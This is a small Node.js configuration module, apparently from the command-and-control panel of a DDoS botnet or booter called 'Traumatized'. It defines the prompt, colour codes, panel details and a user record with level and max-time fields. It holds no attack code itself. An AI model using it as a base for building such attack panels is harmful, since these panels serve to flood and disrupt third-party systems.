const fs = require("fs");
const crud = require("./auth/crud.js");

exports.hostname = function(name) {
    if(!name) {
        name = "CNC";
    }
    return "\x1b[33m[Traumatized@" + name + "]#~ ";
}

exports.Colors = {
    "Red": "\x1b[31m",
    "Yellow": "\x1b[33m",
    "Blue": "\x1b[34m",
    "Purple": "\x1b[35m",
    "Green": "\x1b[32m",
    "Cyan": "\x1b[96m",
    "Black": "\x1b[30m",
    "Grey": "\x1b[90m",
    "Reset": "\x1b[39m",
    "Clear": "\033[2J\033[1;1H",
    "Moving_text": "\e[5mBlink",
    "movingtext2": "\x1b[5mBlink"
}

exports.CNC_Info = {
    "Name": "Traumatized",
    "Description": "The Land Of Packets",
    "Version": "3.00",
    "Discord_server": "scrapy.tech/discord"
}

exports.CurrentCMD = {
    "Cmd": "",
    "arg": [],
    "fullcmd": ""
}

exports.CurrentUser = {
    "Username": "",
    "IP": "",
    "Password": "",
    "Level": "",
    "Maxtime": "",
    "isAdmin": ""
}

exports.GetCurrentUser = function() {
    
}